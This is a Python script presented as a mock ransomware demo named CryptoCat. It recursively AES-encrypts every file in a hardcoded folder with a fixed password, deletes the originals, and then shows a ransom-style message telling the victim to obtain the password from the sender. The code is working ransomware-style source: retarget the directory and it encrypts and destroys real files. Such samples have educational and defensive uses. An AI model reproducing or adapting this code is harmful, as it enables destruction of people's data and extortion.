# ----- License ------------------------------------------- #
# CryptoCat Copyright (C) 2024 Nandan A M
# This program comes with ABSOLUTELY NO WARRANTY.
# This is free software, and you are welcome to redistribute it under certain conditions.

# ----- Libraries -------------------------------------------------- #
import os  # For file system operations
import pyAesCrypt  # For AES encryption and decryption
from rich.console import Console  # For rich text output in the terminal
import time  # For time-related functions (e.g., delays)

# ----- Global Declaration ----------------------------------------- #
console = Console()  # Initialize a Console object for printing rich text
directory = r"C:\Users\Maria Kevin\OneDrive\Desktop\Mini Spectra\FileEncryption\Want_to_Encrypt"  # Directory for file encryption/decryption
password = "123456789"  # Encryption/Decryption password
bufferSize = 64 * 1024  # Buffer size for encryption/decryption process

# ----- Banner ----------------------------------------------------- #
def banner():
    # Prints a banner in the terminal using rich text formatting
    console.print(rf"""[bold yellow]
┌──────────────────────────────────────────────────────────────────────────────────────┐
│                                                                                      │                                                                                
│     .d8888b.                            888             .d8888b.           888       │
│    d88P  Y88b                           888            d88P  Y88b          888       │
│    888    888                           888            888    888          888       │
│    888        888d888 888  888 88888b.  888888 .d88b.  888         8888b.  888888    │ 
│    888        888P"   888  888 888 "88b 888   d88""88b 888            "88b 888       │
│    888    888 888     888  888 888  888 888   888  888 888    888 .d888888 888       │
│    Y88b  d88P 888     Y88b 888 888 d88P Y88b. Y88..88P Y88b  d88P 888  888 Y88b.     │
│     "Y8888P"  888      "Y88888 88888P"   "Y888 "Y88P"   "Y8888P"  "Y888888  "Y888    │
│                            888 888                                                   │
│                       Y8b d88P 888                                                   │
│                        "Y88P"  888                                                   │ 
│                                                                                      │  
│                                        +-+-+                                         │    
│                                  [#c61a09]Made by HackSpectra[bold yellow]                                 │
│                                        +-+-+                                         │
│                                                                                      │
└──────────────────────────────────────────────────────────────────────────────────────┘        
    """)  # Displays a graphical banner with text and styling

# ----- File Encryption -------------------------------------------- #
def encryption():
    # Walks through the directory and encrypts each file
    for root, dirs, files in os.walk(directory):
        for file in files:
            filePath = os.path.join(root, file)  # Get full path of the file
            pyAesCrypt.encryptFile(filePath, filePath + ".aes", password, bufferSize)  # Encrypt the file and save with .aes extension
    
    # List all files in the directory, and filter out files that have been encrypted
    files_in_directory = os.listdir(directory)
    filtered_files = [file for file in files_in_directory if not file.endswith(".aes")]
    
    # Remove the original files after encryption
    for file in filtered_files:
        path_to_file = os.path.join(directory, file)
        os.remove(path_to_file)  # Delete the original file

# ----- File Decryption -------------------------------------------- #
def decryption():
    # Walks through the directory and decrypts each encrypted file
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(".aes"):  # Check if file is encrypted
                filepath = os.path.join(root, file)  # Get full path of the encrypted file
                pyAesCrypt.decryptFile(filepath, filepath[:-4], password, bufferSize)  # Decrypt the file and remove .aes extension
    
    # List all files in the directory, and filter out decrypted files
    files_in_directory = os.listdir(directory)
    filtered_files = [file for file in files_in_directory if file.endswith(".aes")]
    
    # Remove the encrypted files after decryption
    for file in filtered_files:
        path_to_file = os.path.join(directory, file)
        os.remove(path_to_file)  # Delete the encrypted file

# ----- Menu ------------------------------------------------------- #
def unlock():
    # This is a mock ransomware scenario asking the user to pay BTC to unlock files
    console.print("[#0000ff]+--------------------------------------------------------------------------------------+")
    console.print("[#c61a09]+ All your files are now encrypted!")  # Simulated message
    console.print("[#c61a09]+ Ask the sender to provide the password to decrypt your encrypted files.")
    console.print("[#c61a09]+ Once we receive request we'll share password to unlock your files")
    console.print("[#0000ff]+--------------------------------------------------------------------------------------+")
    
    # User enters password to decrypt files (mimicking a ransom scenario)
    password2 = console.input("[white]+ Enter the password: ")
    if (password2 == password):  # If the correct password is entered
        console.print("[#0000ff]+--------------------------------------------------------------------------------------+")
        console.print("[#66ff00]+ Your File is Decrypted")  # Message indicating payment received
        time.sleep(2)  # Simulate a delay
        decryption()  # Decrypt the files
        console.print("[#66ff00]+ We have unlocked your files....")  # Files are unlocked
        console.print("[#0000ff]+--------------------------------------------------------------------------------------+")
    else:
        console.print("[#0000ff]+--------------------------------------------------------------------------------------+")
        console.print("[#c61a09]+ You have entered the wrong password!")  # Wrong password entered
        console.print("[#c61a09]+ All your files are corrupted....")  # Simulate files being corrupted
        console.print("[#0000ff]+--------------------------------------------------------------------------------------+")
    
# ----- Main Function ---------------------------------------------- #
if __name__=="__main__":
    banner()  # Display banner
    encryption()  # Encrypt files in the specified directory
    unlock()  # Ask user to input the password and unlock files

# ----- End -------------------------------------------------------- #
